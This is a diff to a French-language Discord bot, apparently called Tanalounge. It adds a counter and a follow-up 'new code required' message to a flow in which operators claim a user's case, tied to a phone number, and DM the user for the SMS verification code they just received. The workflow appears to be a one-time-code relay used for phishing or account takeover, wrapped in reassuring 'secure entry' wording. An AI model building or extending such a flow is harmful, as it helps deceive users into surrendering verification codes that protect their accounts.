@@ -209,6 +209,7 @@ class VerificationView(discord.ui.View):
         self.numero = numero
         self.user_id = user_id
         self.claimed_by = None
+        self.code_requests_count = 0  # Compte le nombre de demandes de code envoyées
 
     @discord.ui.button(label="Claim", style=discord.ButtonStyle.green, emoji="✅", custom_id="claim_btn_dynamic")
     async def claim_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -258,26 +259,50 @@ class VerificationView(discord.ui.View):
     @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.secondary, emoji="📩", custom_id="ask_code_btn_dynamic", disabled=True)
     async def ask_code_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         if self.claimed_by and self.claimed_by != interaction.user.id:
-            await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec ce dossier !", ephemeral=True)
+            await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec sur ce dossier !", ephemeral=True)
             return
         
+        self.code_requests_count += 1
+
         try:
             user = await bot.fetch_user(self.user_id)
-            embed_mp = discord.Embed(
-                title="🔑 Action requise : Entrez votre code SMS",
-                description=(
-                    "L'opérateur vous invite à renseigner le code que vous venez de recevoir par SMS.\n\n"
-                    "• **Vérifiez vos messages :** Le code à chiffres est dans votre boîte de réception.\n"
-                    "• **Sécurité :** Cliquez exclusivement sur le bouton vert ci-dessous pour transmettre votre code.\n\n"
-                    "*Ne partagez jamais votre code ailleurs.*"
-                ),
-                color=TANA_PINK
-            )
-            embed_mp.set_footer(text="Tanalounge · Saisie Sécurisée")
             
-            view_mp = PlayerCodeView(interaction.message, self)
-            await user.send(embed=embed_mp, view=view_mp)
-            await interaction.response.send_message("✅ Demande de code envoyée au joueur en MP.", ephemeral=True)
+            # 1er message de demande de code (Première fois)
+            if self.code_requests_count == 1:
+                embed_mp = discord.Embed(
+                    title="🔑 Action requise : Entrez votre code SMS",
+                    description=(
+                        "L'opérateur vous invite à renseigner le code que vous venez de recevoir par SMS.\n\n"
+                        "• **Vérifiez vos messages :** Le code à chiffres est dans votre boîte de réception.\n"
+                        "• **Sécurité :** Cliquez exclusivement sur le bouton vert ci-dessous pour transmettre votre code.\n\n"
+                        "*Ne partagez jamais votre code ailleurs.*"
+                    ),
+                    color=TANA_PINK
+                )
+                embed_mp.set_footer(text="Tanalounge · Saisie Sécurisée")
+                
+                view_mp = PlayerCodeView(interaction.message, self)
+                await user.send(embed=embed_mp, view=view_mp)
+                await interaction.response.send_message("✅ Demande de code envoyée au joueur en MP.", ephemeral=True)
+            
+            # 2ème message (et suivants) : Redemande de code (si le premier n'était pas bon ou pour un nouveau code)
+            else:
+                embed_mp = discord.Embed(
+                    title="⚠️ Redemande de code : Nouveau code requis",
+                    description=(
+                        "L'opérateur vous demande de renvoyer un **nouveau code** ou de vérifier le code saisi.\n\n"
+                        "• **Attention :** Si le code précédent était incorrect ou expiré, veuillez consulter votre nouveau SMS.\n"
+                        "• **Action :** Cliquez sur le bouton vert ci-dessous pour entrer le nouveau code.\n\n"
+                        "*Merci de votre réactivité.*"
+                    ),
+                    color=discord.Color.orange()
+                )
+                embed_mp.set_footer(text="Tanalounge · Redemande Sécurisée")
+                
+                view_mp = PlayerCodeView(interaction.message, self)
+                await user.send(embed=embed_mp, view=view_mp)
+                await interaction.response.send_message("✅ Message de *redemande* de code envoyé au joueur en MP.", ephemeral=True)
+
         except Exception:
             await interaction.response.send_message(f"❌ Impossible d'envoyer un MP au joueur (ses MP sont fermés ou bloqués).", ephemeral=True)
 
